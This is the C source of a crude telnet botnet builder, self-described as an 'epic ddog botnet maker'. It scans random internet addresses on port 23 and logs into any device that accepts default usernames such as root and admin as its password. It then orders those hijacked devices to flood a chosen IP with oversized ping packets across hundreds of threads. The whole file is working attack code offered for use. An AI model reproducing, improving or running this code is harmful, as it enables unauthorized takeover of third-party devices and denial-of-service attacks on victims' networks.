#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>

/* Version 0.2 
   Hav fun!
*/

#define maxbots 100000        // goal bot number
#define dospower 500        // threads to use for ddos
#define pass "pinoy"       // pass to start program
#define timeout 1      // bot connect and receive timeout in seconds
#define botport 23 // bot port

#define RED     "\x1b[31;1m"
#define GREEN   "\x1b[32;1m"
#define YELLOW  "\x1b[33;1m"
#define BLUE    "\x1b[34;1m"
#define MAGENTA "\x1b[35;1m"
#define CYAN    "\x1b[36;1m"
#define RESET   "\x1b[0;1m"

char *cmd;
int debug;
int bots;
char botnet[maxbots][16];
char usertest[5][10];
int botuser[maxbots];
char help[200];
struct timeval tv;

int tryit(char *ip, int i) {
 struct sockaddr_in sa;
 sa.sin_addr.s_addr = inet_addr(ip); 
 sa.sin_port = htons(botport); 
 sa.sin_family = AF_INET; 
 if(debug == 1) {
  dprintf(1, "%sTrying %s Combination: %s%s\n", BLUE, ip, usertest[i], RESET);
 }
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  char *resp = malloc(1024);
  send(fd, usertest[i], strlen(usertest[i]), MSG_NOSIGNAL);
  send(fd, usertest[i], strlen(usertest[i]), MSG_NOSIGNAL);
  recv(fd, resp, 1024, 0); 
  if(debug == 1) {
   dprintf(1, "%s%s\n%s", RED, resp, RESET);
  }
  if(strstr(resp, usertest[i])) {
   dprintf(1, "%sNew Bot --> %s with Combination: %s%s\n", GREEN, ip, usertest[i], RESET); 
   strcpy(botnet[bots], ip);
   botuser[bots] = i;
   bots++;
  } 
  free(resp);
  close(fd);
 }    
}

void *findbot(void *unused) {
 while(1) {
  if(bots < maxbots) {
   char ip[16];
   int a,b,c,d;
   a = rand() % (255 - 0) + 0;
   b = rand() % (255 - 0) + 0;
   c = rand() % (255 - 0) + 0; 
   d = rand() % (255 - 0) + 0;  
   sprintf(ip, "%d.%d.%d.%d", a, b, c, d); 
   struct sockaddr_in sa;
   sa.sin_addr.s_addr = inet_addr(ip); 
   sa.sin_port = htons(botport); 
   sa.sin_family = AF_INET; 
   int fd = socket(AF_INET, SOCK_STREAM, 0); 
   setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
   setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
   if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
    close(fd); 
    for(int i = 0; i < 5; i++) {
     tryit(ip, i);
    }
   }
   memset(ip, 0, strlen(ip));
  }
 }
}

void *ddog(void *unused) {
 if(bots != 0) {
  int i = rand() % (bots - 0) + 0;
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); 
  struct sockaddr_in sa;
  sa.sin_addr.s_addr = inet_addr(botnet[i]); 
  sa.sin_port = htons(botport); 
  sa.sin_family = AF_INET; 
  int num = botuser[i];
  if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
   send(fd, usertest[num], strlen(usertest[num]), MSG_NOSIGNAL);
   send(fd, usertest[num], strlen(usertest[num]), MSG_NOSIGNAL);
   send(fd, cmd, strlen(cmd), MSG_NOSIGNAL);
   dprintf(1, "%ssent through %s\n%s", YELLOW, botnet[i], RESET);
   close(fd);
  }
 }
}

int sendcmd() {
 int timeint;
 char ip[64]; 
 dprintf(1, "ip: ");
 read(1, ip, 64); 
 if(strstr(ip, "\n")) {
  char *newl = strstr(ip, "\n");
  newl[0] = 0;
 }
 dprintf(1, "time: "); 
 scanf("%d", &timeint);
 if(timeint == 0) {
  timeint = 1;
 }
 cmd = malloc(124); 
 sprintf(cmd, "ping -c 100 -s 65500 %s\r\n", ip);
 dprintf(1, "Request:\n%s", cmd);
 sleep(3);
 int a = 0;
 pthread_t dogthread[dospower];
 while(a < timeint) { 
  for(int i = 0; i < dospower; i++) {
   pthread_create(&dogthread[i], 0, &ddog, 0);
  }               
  for(int i = 0; i < dospower; i++) {
   pthread_join(dogthread[i], 0);
  }
  a++;
  dprintf(1, "%d of %d done\n", a, timeint);
 }
 free(cmd);
 timeint = 0;
 memset(ip, 0, strlen(ip));
}

void *command(void *unused) {
 char a;
 while(1) {
  a = getc(stdin);
  switch(a) {
   case 's':
    dprintf(1, "%sTotal bots: %d\n",GREEN, bots); 
    break;
   case 'c':
    sendcmd();
    break;
    case 'e':
     exit(0);
     break;
    case 'd': 
     debug = 1;
     break;
    case 'o':
     debug = 0;
     break;
    case 'l': 
     dprintf(1, "%sBOT LIST: %s\n", RED, RESET);
     for(int i = 0; i < bots; i++) {
      dprintf(1, "%sbot[%d]%s:%s\n%s\x07", BLUE, i, RED, botnet[i], RESET);
     } 
     break;
    case '?': 
     dprintf(1, "%s%s%s", RED, help, RESET);
     break;
  }
 }
}

int makeusers() {
 strcpy(usertest[0], "root\r\n");
 strcpy(usertest[1], "admin\r\n");
 strcpy(usertest[2], "user\r\n");
 strcpy(usertest[3], "sysadm\r\n");
 strcpy(usertest[4], "unix\r\n");
}

int main(int argc, char **argv) {
 makeusers();
 tv.tv_sec = timeout;
 system("clear");
 char *password = malloc(8);
 dprintf(1, "%spassword: %s", RED, RESET);
 read(1, password, 8);
 if(strncmp(password, pass, 5) == 0) {
  dprintf(1, "%sCorrect!%s\n", GREEN, RESET);
 } else { 
  dprintf(1, "%sWrong!%s\n", RED, RESET);
  exit(0);
 }
 free(password);
 dprintf(1, "%sWelcome to epic ddog botnet maker\nCoded by chakal\n%sMax Bots: %d\nDos Power: %d\n%s", BLUE, GREEN, maxbots, dospower, RESET);
 strcpy(help, "\n s - status\n c - command\n e - exit\n d - debug mode\n o - off debug\n l - list\n ? - help\n");
 int thread;
 if(argv[1]) {
  thread = atoi(argv[1]);
 } else {
  thread = 100;
 }
 bots = 0;
 srand(time(0));
 dprintf(1, "%s", RED);
 dprintf(1, "%s", help);
 dprintf(1, "%s", RESET);
 sleep(1);
 dprintf(1, "%s", BLUE);
 dprintf(1, "\nFinding bots\n");
 dprintf(1, "%s", RESET);
 sleep(1);
 pthread_t threads[thread];
 pthread_t comm;
 pthread_create(&comm, 0, &command, 0);
 while(1) {
  for(int i = 0; i < thread; i++) {
   pthread_create(&threads[i], 0, &findbot, 0);
  }
  for(int i = 0; i < thread; i++) {
   pthread_join(threads[i], 0);
  }
 }
}